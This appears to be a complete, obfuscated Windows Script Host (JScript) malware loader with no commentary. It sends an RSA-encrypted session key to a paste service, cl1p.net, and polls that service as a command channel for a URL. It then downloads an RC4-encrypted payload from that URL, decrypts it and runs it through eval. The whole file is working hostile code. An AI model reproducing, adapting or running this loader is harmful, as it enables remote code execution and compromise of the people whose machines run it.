var _n="d742e28eb02dc3334754f1059535d814d08f0690b0060a1602e4bb9b5459fd8874742cd1a066b817367f7f8d1a433814cb30a57ffe5af982f843c47e5fe885d20952ded8d0e773c9747ffaa78d3f0279fc0bff9d6b67f42e2f88428ccc02f143825011b64ea9327c27b555a9e74252526a69a7aba02d84f45e08e557cf7c103d";
var _rq="gh-i-c41da91774",_rp="gh-o-";
var _u="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
var _sl=function(ms){try{WScript.Sleep(ms);}catch(z){}};
var _hb=function(s){
    var L="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",d={};
    for(var q=0;q<64;q++)d[L.charAt(q)]=q;
    var o=[],a=0,c=0,u;
    for(q=0;q<s.length;q++){
        u=d[s.charAt(q)];
        if(u===undefined)continue;
        a=(a*64)+u;c++;
        if(c===4){o.push((a/65536)&255,(a/256)&255,a&255);a=0;c=0;}
    }
    if(c===2)o.push((a/16)&255);
    else if(c===3){o.push((a/1024)&255,(a/4)&255);}
    return o;
};
var _b64=function(b){
    var L="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",o="";
    for(var i=0;i<b.length;i+=3){
        var x=b[i],y=(i+1<b.length)?b[i+1]:0,z=(i+2<b.length)?b[i+2]:0;
        o+=L.charAt(x>>2)+L.charAt(((x&3)<<4)|(y>>4));
        o+=(i+1<b.length)?L.charAt(((y&15)<<2)|(z>>6)):"=";
        o+=(i+2<b.length)?L.charAt(z&63):"=";
    }
    return o;
};
var _rnd=function(n){
    var a=[];
    for(var i=0;i<n;i++){var r=Math.random()*256;a.push(r&255);}
    return a;
};
var _hex2b=function(s){
    var a=[];
    for(var i=0;i<s.length;i+=2)a.push(parseInt(s.substr(i,2),16));
    return a;
};
var _lim=function(b){
    var L=[],n=b.length;
    for(var i=n-1;i>=0;i-=2){var lo=b[i],hi=(i-1>=0)?b[i-1]:0;L.push((hi<<8)|lo);}
    return L;
};
var _byt=function(L,n){
    var o=[];for(var i=0;i<n;i++)o.push(0);
    for(i=0;i<L.length;i++){var v=L[i];o[n-1-2*i]=v&255;if(n-2-2*i>=0)o[n-2-2*i]=(v>>8)&255;}
    return o;
};
var _cmp=function(a,b){
    var la=a.length,lb=b.length;
    while(la>0&&a[la-1]===0)la--;
    while(lb>0&&b[lb-1]===0)lb--;
    if(la!==lb)return la>lb?1:-1;
    for(var i=la-1;i>=0;i--)if(a[i]!==b[i])return a[i]>b[i]?1:-1;
    return 0;
};
var _sub=function(a,b){
    var r=[],br=0;
    for(var i=0;i<a.length;i++){
        var v=(a[i]||0)-(b[i]||0)-br;
        if(v<0){v+=65536;br=1;}else br=0;
        r.push(v);
    }
    return r;
};
var _mul=function(a,b){
    var r=[],i,j;
    for(i=0;i<a.length+b.length;i++)r.push(0);
    for(i=0;i<a.length;i++){
        var c=0;
        for(j=0;j<b.length;j++){
            var cur=r[i+j]+a[i]*b[j]+c;
            r[i+j]=cur&65535;c=Math.floor(cur/65536);
        }
        var k=i+b.length;
        while(c){var c2=r[k]+c;r[k]=c2&65535;c=Math.floor(c2/65536);k++;}
    }
    while(r.length>1&&r[r.length-1]===0)r.pop();
    return r;
};
var _shl=function(a){
    var r=[],c=0;
    for(var i=0;i<a.length;i++){var v=a[i]*2+c;r.push(v&65535);c=v>>16;}
    if(c)r.push(c);
    return r;
};
var _mod=function(a,m){
    var r=[],bits=a.length*16,hb=bits-1;
    while(hb>=0&&((a[hb>>4]>>(hb&15))&1)===0)hb--;
    for(var i=hb;i>=0;i--){
        r=_shl(r);
        if(((a[i>>4]>>(i&15))&1)){if(!r.length)r.push(0);r[0]|=1;}
        if(_cmp(r,m)>=0)r=_sub(r,m);
    }
    return r;
};
var _rsa=function(be){
    var m=_lim(be),base=m;
    for(var i=0;i<16;i++)base=_mod(_mul(base,base),_lim(_hex2b(_n)));
    return _byt(_mod(_mul(base,m),_lim(_hex2b(_n))),128);
};
var _r4=function(k,b){
    var box=[],j=0,t;
    for(var i=0;i<256;i++)box[i]=i;
    for(i=0;i<256;i++){j=(j+box[i]+k[i%k.length])%256;t=box[i];box[i]=box[j];box[j]=t;}
    var x=0;j=0,res=[];
    for(var n=0;n<b.length;n++){
        x=(x+1)%256;j=(j+box[x])%256;t=box[x];box[x]=box[j];box[j]=t;
        res.push(b[n]^box[(box[x]+box[j])%256]);
    }
    return res;
};
var _bs=function(b){
    var s="";
    for(var i=0;i<b.length;i++){
        var c=b[i];
        if(c<128)s+=String.fromCharCode(c);
        else if(c>=192&&c<224){s+=String.fromCharCode(((c&31)<<6)|(b[i+1]&63));i++;}
        else if(c>=224){s+=String.fromCharCode(((c&15)<<12)|((b[i+1]&63)<<6)|(b[i+2]&63));i+=2;}
    }
    return s;
};
var _enc=function(s){
    return s.replace(/\+/g,"%2B").replace(/\//g,"%2F").replace(/=/g,"%3D").replace(/:/g,"%3A");
};
var _post=function(url,body){
    try{
        var io=WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
        io.Open("POST",url,false);
        io.SetRequestHeader("User-Agent",_u);
        io.SetRequestHeader("Content-Type","application/x-www-form-urlencoded");
        io.Send(body);
        var st=io.Status;try{io.Abort();}catch(z){}
        return st;
    }catch(e){return 0;}
};
var _get=function(url){
    try{
        var io=WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
        io.Open("GET",url,false);
        io.SetRequestHeader("User-Agent",_u);
        io.Send();
        if(io.Status!==200){try{io.Abort();}catch(z){}return null;}
        var t=io.ResponseText;try{io.Abort();}catch(z2){}
        return t;
    }catch(e2){return null;}
};
var _run=function(url){
    for(var t=0;t<6;t++){
        var txt=_get(url);
        if(txt&&txt.length>64){
            var raw=_hb(txt);
            if(raw&&raw.length>300){
                var mm=url.match(/s=([0-9a-fA-F]+)/);
                var kb=mm?_hex2b(mm[1]):[];
                if(kb.length){
                    var by=_r4(kb,raw);
                    if(by&&by.length>500){
                        var code=_bs(by);
                        if(code.length>50000){try{__c2src=code;}catch(zS){}try{eval(code);return;}catch(z3){}}
                    }
                }
            }
        }
        _sl(3000);
    }
};
var _go=function(){
    var _id="";
    for(var i=0;i<12;i++)_id+="0123456789abcdef".charAt(Math.floor(Math.random()*16));
    var _kv=_rnd(16);
    var _msg=[0].concat(_rnd(111),_kv);
    var _req=_id+":"+_b64(_rsa(_msg));
    for(var r=0;r<24;r++){
        _post("https://cl1p.net/"+_rq,"content="+_enc(_req)+"&submit=Save");
        for(var t=0;t<4;t++){
            var txt=_get("https://api.cl1p.net/"+_rp+_id);
            if(txt&&txt.length>8){
                var by=_r4(_kv,_hb(txt.replace(/^\s+|\s+$/g,"")));
                if(by&&by.length>10){
                    var u=_bs(by);
                    if(/^https:\/\//.test(u)){_run(u);return;}
                }
            }
            _sl(2500);
        }
    }
};
_go();
